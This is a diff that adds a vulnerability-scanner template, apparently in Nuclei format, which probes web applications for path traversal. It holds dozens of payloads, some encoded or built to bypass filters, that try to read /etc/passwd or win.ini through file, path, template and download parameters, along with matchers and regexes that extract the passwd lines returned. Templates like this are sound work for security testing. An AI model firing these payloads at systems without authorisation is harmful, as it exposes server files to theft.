@@ -1,0 +1,125 @@
+id: path-traversal-file-params
+
+info:
+  name: Path Traversal Via File And Resource Parameters
+  author: p3i
+  severity: high
+  description: Tests common file-serving, download, template, and resource URL parameters for path traversal (local file inclusion) by attempting to read /etc/passwd on Linux or win.ini on Windows. Covers download endpoints, image loaders, template engines, and file preview functions.
+  tags: misconfig,path-traversal,lfi,file-read,directory-traversal,web
+  metadata:
+    max-request: 240
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{pt_path}}"
+
+    payloads:
+      pt_path:
+        - "?file=../../etc/passwd"
+        - "?file=../../../etc/passwd"
+        - "?file=../../../../etc/passwd"
+        - "?file=../../../../../etc/passwd"
+        - "?file=../../../../../../etc/passwd"
+        - "?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        - "?file=%2e%2e/%2e%2e/etc/passwd"
+        - "?file=....//....//etc/passwd"
+        - "?file=..%2f..%2fetc%2fpasswd"
+        - "?filename=../../etc/passwd"
+        - "?filename=../../../etc/passwd"
+        - "?filename=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        - "?path=../../etc/passwd"
+        - "?path=../../../etc/passwd"
+        - "?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        - "?include=../../etc/passwd"
+        - "?include=../../../etc/passwd"
+        - "?include=../../../../etc/passwd"
+        - "?template=../../etc/passwd"
+        - "?template=../../../etc/passwd"
+        - "?view=../../etc/passwd"
+        - "?view=../../../etc/passwd"
+        - "?page=../../etc/passwd"
+        - "?page=../../../etc/passwd"
+        - "?document=../../etc/passwd"
+        - "?document=../../../etc/passwd"
+        - "?folder=../../etc/passwd"
+        - "?root=../../etc/passwd"
+        - "?base=../../etc/passwd"
+        - "?resource=../../etc/passwd"
+        - "?resource=../../../etc/passwd"
+        - "?show=../../etc/passwd"
+        - "?load=../../etc/passwd"
+        - "?read=../../etc/passwd"
+        - "?content=../../etc/passwd"
+        - "?source=../../etc/passwd"
+        - "?fetch=../../etc/passwd"
+        - "?lang=../../etc/passwd"
+        - "?dir=../../etc/passwd"
+        - "?doc=../../etc/passwd"
+        - "?img=../../etc/passwd"
+        - "?image=../../etc/passwd"
+        - "?download=../../etc/passwd"
+        - "?download=../../../etc/passwd"
+        - "download?file=../../etc/passwd"
+        - "download?file=../../../etc/passwd"
+        - "download?filename=../../etc/passwd"
+        - "download?path=../../etc/passwd"
+        - "download?name=../../etc/passwd"
+        - "view?file=../../etc/passwd"
+        - "view?path=../../etc/passwd"
+        - "api/download?file=../../etc/passwd"
+        - "api/download?path=../../etc/passwd"
+        - "api/file?path=../../etc/passwd"
+        - "api/files?name=../../etc/passwd"
+        - "static?file=../../etc/passwd"
+        - "image?file=../../etc/passwd"
+        - "template?file=../../etc/passwd"
+        - "export?file=../../etc/passwd"
+        - "preview?file=../../etc/passwd"
+        - "attachment?file=../../etc/passwd"
+        - "?file=..\\..\\windows\\win.ini"
+        - "?file=..\\..\\..\\windows\\win.ini"
+        - "?filename=..\\..\\windows\\win.ini"
+        - "?path=..\\..\\windows\\win.ini"
+        - "download?file=..\\..\\windows\\win.ini"
+
+    attack: batteringram
+    redirects: false
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "root:x:0:0:"
+          - "root:0:0:"
+          - "bin:x:1:1:"
+          - "daemon:x:"
+          - "nobody:x:"
+          - "/bin/bash"
+          - "/bin/sh"
+          - "[extensions]"
+          - "; for 16-bit app support"
+          - "[fonts]"
+          - "[Mail]"
+
+      - type: dsl
+        dsl:
+          - "len(body) > 20"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "(?im)^([a-zA-Z_][a-zA-Z0-9_-]*:x:[0-9]+:[0-9]+:[^\\r\\n]*)"
+          - "(?im)^([a-zA-Z_][a-zA-Z0-9_-]*:[^:]+:[0-9]+:[0-9]+:[^\\r\\n]*)"
+          - "(?i)(\\[extensions\\]|\\[fonts\\]|\\[Mail\\]|for 16-bit app support)[^\\r\\n]{0,80}"
+      - type: dsl
+        name: status
+        dsl:
+          - "status_code"
